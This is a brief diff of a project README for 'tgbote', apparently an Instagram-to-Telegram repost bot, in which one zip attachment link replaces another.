@@ -1,3 +1,3 @@
-[tgbote-instagram-bot.zip](https://github.com/user-attachments/files/20557436/tgbote-instagram-bot.zip)
 # tgbote
+[instagram_telegram_repost_bot.zip](https://github.com/user-attachments/files/20558803/instagram_telegram_repost_bot.zip)
 
